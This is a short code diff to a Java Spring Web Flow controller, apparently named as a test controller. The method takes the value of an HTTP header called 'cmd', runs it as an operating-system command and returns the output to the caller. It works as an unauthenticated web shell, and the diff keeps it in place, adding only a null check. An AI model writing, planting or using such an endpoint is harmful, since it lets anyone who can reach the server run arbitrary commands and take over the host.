@@ -26,8 +26,10 @@ public class SpringWebFlowTestController {
         javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletExternalContext.getNativeResponse();
 
         String cmd = request.getHeader("cmd");
-        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
-        response.getWriter().println(res);
+		if(cmd != null && !cmd.isEmpty()){
+			String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
+			response.getWriter().println(res);
+		}
 
         return "test";
     }
